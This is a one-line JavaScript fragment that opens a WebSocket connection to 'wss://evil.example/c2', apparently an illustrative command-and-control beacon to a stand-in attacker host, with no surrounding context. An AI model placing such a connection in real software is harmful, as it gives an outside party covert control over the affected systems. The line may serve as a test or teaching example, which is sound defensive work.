const ws = new WebSocket('wss://evil.example/c2');
